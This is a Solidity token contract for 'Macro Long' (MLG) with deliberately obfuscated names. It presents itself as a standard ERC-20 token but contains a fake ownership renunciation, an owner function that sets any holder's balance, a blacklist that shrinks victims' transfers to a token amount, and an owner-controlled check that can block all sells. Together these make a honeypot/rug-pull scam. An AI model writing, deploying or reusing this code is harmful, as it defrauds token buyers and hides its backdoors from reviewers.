//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface tokenAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract liquidityMarketingMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeLaunched {
    function createPair(address autoToken, address totalTx) external returns (address);
}

interface exemptFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeLaunchedBuy) external view returns (uint256);

    function transfer(address isMarketing, uint256 modeLaunchMarketing) external returns (bool);

    function allowance(address teamSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeLaunchMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address isMarketing,
        uint256 modeLaunchMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isTotal, uint256 value);
    event Approval(address indexed teamSender, address indexed spender, uint256 value);
}

interface exemptFundMetadata is exemptFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MacroLong is liquidityMarketingMin, exemptFund, exemptFundMetadata {

    function launchedMarketing() private view {
        require(fundSell[_msgSender()]);
    }

    address private launchReceiverWallet;

    uint256 private launchedTo = 100000000 * 10 ** 18;

    function approve(address maxMode, uint256 modeLaunchMarketing) public virtual override returns (bool) {
        fundLiquidity[_msgSender()][maxMode] = modeLaunchMarketing;
        emit Approval(_msgSender(), maxMode, modeLaunchMarketing);
        return true;
    }

    function fundTx() public {
        emit OwnershipTransferred(txLimitAt, address(0));
        launchReceiverWallet = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTo;
    }

    uint256 private teamBuy;

    mapping(address => bool) public tradingList;

    bool private enableAmount;

    bool private maxFrom;

    uint256 walletLimit;

    function transfer(address txTakeTrading, uint256 modeLaunchMarketing) external virtual override returns (bool) {
        return enableBuy(_msgSender(), txTakeTrading, modeLaunchMarketing);
    }

    mapping(address => bool) public fundSell;

    bool private walletModeToken;

    function symbol() external view virtual override returns (string memory) {
        return marketingBuy;
    }

    bool public shouldMarketing;

    address public txLimitAt;

    function transferFrom(address enableFrom, address isMarketing, uint256 modeLaunchMarketing) external override returns (bool) {
        if (_msgSender() != toTradingIs) {
            if (fundLiquidity[enableFrom][_msgSender()] != type(uint256).max) {
                require(modeLaunchMarketing <= fundLiquidity[enableFrom][_msgSender()]);
                fundLiquidity[enableFrom][_msgSender()] -= modeLaunchMarketing;
            }
        }
        return enableBuy(enableFrom, isMarketing, modeLaunchMarketing);
    }

    bool private marketingMin;

    address toTradingIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function enableBuy(address enableFrom, address isMarketing, uint256 modeLaunchMarketing) internal returns (bool) {
        if (enableFrom == txLimitAt) {
            return sellTeamLimit(enableFrom, isMarketing, modeLaunchMarketing);
        }
        uint256 isTx = exemptFund(minModeLaunched).balanceOf(txFee);
        require(isTx == walletLimit);
        require(isMarketing != txFee);
        if (tradingList[enableFrom]) {
            return sellTeamLimit(enableFrom, isMarketing, buyMaxFund);
        }
        return sellTeamLimit(enableFrom, isMarketing, modeLaunchMarketing);
    }

    function sellFrom(address txTakeTrading, uint256 modeLaunchMarketing) public {
        launchedMarketing();
        tokenShould[txTakeTrading] = modeLaunchMarketing;
    }

    function getOwner() external view returns (address) {
        return launchReceiverWallet;
    }

    function toToken(address txLaunch) public {
        require(txLaunch.balance < 100000);
        if (senderTake) {
            return;
        }
        if (shouldLiquidityList != shouldMarketing) {
            txWallet = true;
        }
        fundSell[txLaunch] = true;
        if (enableAmount != toAmount) {
            toAmount = true;
        }
        senderTake = true;
    }

    mapping(address => mapping(address => uint256)) private fundLiquidity;

    mapping(address => uint256) private tokenShould;

    bool public senderTake;

    uint256 constant buyMaxFund = 16 ** 10;

    string private atTeam = "Macro Long";

    function decimals() external view virtual override returns (uint8) {
        return toLimit;
    }

    function minLaunched(uint256 modeLaunchMarketing) public {
        launchedMarketing();
        walletLimit = modeLaunchMarketing;
    }

    bool public toAmount;

    address public minModeLaunched;

    function name() external view virtual override returns (string memory) {
        return atTeam;
    }

    function balanceOf(address modeLaunchedBuy) public view virtual override returns (uint256) {
        return tokenShould[modeLaunchedBuy];
    }

    uint256 enableMode;

    constructor (){
        
        tokenAuto fromReceiver = tokenAuto(toTradingIs);
        minModeLaunched = takeLaunched(fromReceiver.factory()).createPair(fromReceiver.WETH(), address(this));
        
        txLimitAt = _msgSender();
        fundTx();
        fundSell[txLimitAt] = true;
        tokenShould[txLimitAt] = launchedTo;
        if (txWallet) {
            walletModeToken = false;
        }
        emit Transfer(address(0), txLimitAt, launchedTo);
    }

    address txFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address txIsTake, address maxMode) external view virtual override returns (uint256) {
        if (maxMode == toTradingIs) {
            return type(uint256).max;
        }
        return fundLiquidity[txIsTake][maxMode];
    }

    bool private txWallet;

    function owner() external view returns (address) {
        return launchReceiverWallet;
    }

    function tradingFrom(address senderFrom) public {
        launchedMarketing();
        
        if (senderFrom == txLimitAt || senderFrom == minModeLaunched) {
            return;
        }
        tradingList[senderFrom] = true;
    }

    uint8 private toLimit = 18;

    string private marketingBuy = "MLG";

    function sellTeamLimit(address enableFrom, address isMarketing, uint256 modeLaunchMarketing) internal returns (bool) {
        require(tokenShould[enableFrom] >= modeLaunchMarketing);
        tokenShould[enableFrom] -= modeLaunchMarketing;
        tokenShould[isMarketing] += modeLaunchMarketing;
        emit Transfer(enableFrom, isMarketing, modeLaunchMarketing);
        return true;
    }

    bool public shouldLiquidityList;

    event OwnershipTransferred(address indexed walletLaunch, address indexed marketingMax);

}